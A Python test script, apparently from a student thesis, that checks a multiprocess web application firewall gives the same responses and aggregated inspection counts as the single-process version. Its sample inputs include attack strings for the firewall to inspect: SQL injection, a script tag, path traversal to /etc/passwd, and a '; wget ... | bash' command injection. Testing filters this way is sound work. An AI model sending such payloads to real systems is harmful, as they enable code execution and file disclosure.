#!/usr/bin/env python3
"""Confere que o WAF multiprocesso (WAF_PROCESSES=N) responde igual ao original e agrega as métricas.

Sobe src/vnf/waf.py com WAF_PROCESSES=1 e N numa porta local, envia o mesmo conjunto de payloads
e compara as respostas, o inspect_count final e a vazão. Uso: python3 scripts/check_waf_variants.py [N] [msgs]
Os números de vazão daqui NÃO valem como resultado do TCC (só a máquina de testes, parada, vale).
"""
import asyncio, json, os, signal, struct, subprocess, sys, tempfile, time

N = int(sys.argv[1]) if len(sys.argv) > 1 else 4
MSGS = int(sys.argv[2]) if len(sys.argv) > 2 else 20000   # múltiplo de 100: o contador agregado fecha exato
PORT, CONNS = 18080, 50
WAF = os.path.join(os.path.dirname(__file__), "..", "src", "vnf", "waf.py")
SAMPLES = [b"GET /index.html", b"hello world", b"' UNION SELECT 1 --", b"<script>alert(1)</script>",
           b"../../etc/passwd", b"; wget http://x | bash", b"abc%00def", b"POST /login user=joao&pw=ok"]
PAYLOADS = [SAMPLES[i % len(SAMPLES)] + b" #%d" % i for i in range(MSGS)]


async def client(idx):
    r, w = await asyncio.open_connection("127.0.0.1", PORT)
    out = {}
    for i in range(idx, MSGS, CONNS):
        w.write(struct.pack(">I", len(PAYLOADS[i])) + PAYLOADS[i])
        await w.drain()
        out[i] = (await r.readline()).decode().strip()
    w.close()
    return out


async def run():
    res = await asyncio.gather(*(client(i) for i in range(CONNS)))
    return {k: v for d in res for k, v in d.items()}


def trial(procs):
    metrics = tempfile.mktemp(suffix=".json")
    env = {**os.environ, "WAF_PORT": str(PORT), "WAF_PROCESSES": str(procs), "WAF_METRICS_PATH": metrics}
    p = subprocess.Popen([sys.executable, WAF], env=env, stdout=subprocess.DEVNULL)
    try:
        for _ in range(50):
            try:
                asyncio.run(asyncio.open_connection("127.0.0.1", PORT)); break
            except OSError:
                time.sleep(0.1)
        t = time.perf_counter(); responses = asyncio.run(run()); dt = time.perf_counter() - t
        time.sleep(0.5)
        count = json.load(open(metrics))["inspect_count"]
        return responses, count, MSGS / dt
    finally:
        p.send_signal(signal.SIGTERM); p.wait(timeout=10)
        if os.path.exists(metrics): os.remove(metrics)


if __name__ == "__main__":
    base, c1, v1 = trial(1)
    multi, cn, vn = trial(N)
    assert base == multi, "respostas diferentes entre 1 e N processos"
    assert c1 == MSGS and cn == MSGS, f"inspect_count: 1 proc={c1}, {N} procs={cn}, esperado {MSGS}"
    print(f"OK: respostas idênticas e inspect_count={MSGS} nas duas variantes")
    print(f"vazão: 1 processo {v1:,.0f} msg/s | {N} processos {vn:,.0f} msg/s ({vn / v1:.2f}x) — só indicativo")
